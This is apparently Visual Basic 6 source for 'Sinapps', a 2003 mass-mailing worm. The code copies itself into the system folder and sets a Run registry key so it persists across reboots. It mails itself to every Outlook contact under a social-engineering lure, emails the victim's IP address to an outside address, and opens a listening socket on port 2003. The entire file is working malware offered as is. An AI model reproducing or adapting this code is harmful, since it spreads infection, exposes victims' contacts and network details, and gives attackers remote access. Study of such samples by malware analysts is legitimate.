VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmSinapps 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Message to AVers"
   ClientHeight    =   3135
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   5670
   BeginProperty Font 
      Name            =   "Verdana"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmSinapps.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3135
   ScaleWidth      =   5670
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtGet 
      Height          =   285
      Left            =   360
      TabIndex        =   4
      Top             =   3600
      Width           =   375
   End
   Begin VB.Frame Frame1 
      Height          =   3015
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   5415
      Begin VB.Timer TimDialog 
         Interval        =   20000
         Left            =   4920
         Top             =   2040
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   4920
         Top             =   2520
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.Label Label3 
         Caption         =   "http://retro.host.sk"
         Height          =   255
         Left            =   360
         TabIndex        =   3
         Top             =   2520
         Width           =   1815
      End
      Begin VB.Label Label2 
         Caption         =   "Retro"
         Height          =   255
         Left            =   360
         TabIndex        =   2
         Top             =   2280
         Width           =   615
      End
      Begin VB.Label Label1 
         Caption         =   $"frmSinapps.frx":0442
         Height          =   1815
         Left            =   240
         TabIndex        =   1
         Top             =   240
         Width           =   5055
      End
   End
End
Attribute VB_Name = "frmSinapps"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Sinapps by Retro - http://retro.host.sk
' Thanks to indovirus.net
' - Iwing, Kefi, magsitr2003, cpu_wizad
' 2/10/03

Dim Voice As SpVoice

Public Sub Form_Load()
On Error Resume Next
Dim hSysMenu As Long
Dim rtname, CopyDir, vopy, Regedit, Fullpath, vicIP, dirFolder
rtname = App.EXEName & ".exe"
CopyDir = "C:\Windows\System\"
vopy = "sinapps.exe"
dirFolder = Dir(CopyDir, vbDirectory)
If dirFolder <> "" Then
 Else
 CopyDir = "C:\Winnit\System32"
End If
Fullpath = CopyDir & vopy
FileCopy rtname, CopyDir & vopy
Set Regedit = CreateObject("wscript.Shell")
Regedit.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Retro\Sinapps", "Infected"
Regedit.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Sinapps", Fullpath
Call SendMail
Call EmailToSelf
Winsock1.LocalPort = 2003
Winsock1.Listen
DisableCloseWindow (Me.hwnd)
End Sub

Function SendMail()
On Error Resume Next
Dim FileName, Fullpath, Mailocx, Addy, Mailmsg, NameaCu
    Fullpath = "C:\Windows\System\"
    FileName = "sinapps.exe"
    Mailocx = Fullpath & FileName
        Set Outlook = CreateObject("Outlook.Application")
          If Outlook = "Outlook" Then
        Set MAPI = Outlook.GetNameSpace("MAPI")
        Set uAddress = MAPI.AddressLists
       For Each Addy In uAddress
          If MAPI.AddressEntries.Count <> 0 Then
             NamaCu = Addy.AddressEntries.Count
       For i = 1 To NamaCu
        Set Mailmsg = Outlook.CreateItem(0 * Rnd())
        Set Surat = Addy.AddressEntries(i)
        
        Mailmsg.To = Surat.Address
        Mailmsg.Subject = "There you go, take a look"
        Mailmsg.Body = "Hey there bud!, I found this program you might enjoy, i think its so funny! Say hello to everyone for me."
        Mailmsg.Attachments.Add Mailocx
        Mailmsg.BCC = Surat.Address(0)
        Mailmsg.DeleteAfterSubmit = True
           If Mailmsg.To <> "" Then
              Mailmsg.Send
           End If
         Next
       End If
     Next
   End If
End Function

Private Sub TimDialog_Timer()
Me.Hide
End Sub

Function EmailToSelf()
Dim Mailmsg2
Set Outlook = CreateObject("Outlook.Application")
          If Outlook = "Outlook" Then
        Set MAPI = Outlook.GetNameSpace("MAPI")
        Set Mailmsg2 = Outlook.CreateItem(0)
           Mailmsg2.To = "retro2@btopenworld.com"
           Mailmsg2.Subject = "Infected user"
           Mailmsg2.Body = "IP: " & Winsock1.LocalIP
           Mailmsg2.DeleteAfterSubmit = True
           Mailmsg2.Send
           End If
End Function

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
If Winsock1.State <> sckClosed Then Winsock1.Close

Winsock1.Accept requestID
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
DoEvents
Dim strData As String
Call Winsock1.GetData(strData$, vbString)
txtGet.Text = strData
Set Voice = New SpVoice
Voice.Speak txtGet.Text, SVSFlagsAsync
End Sub



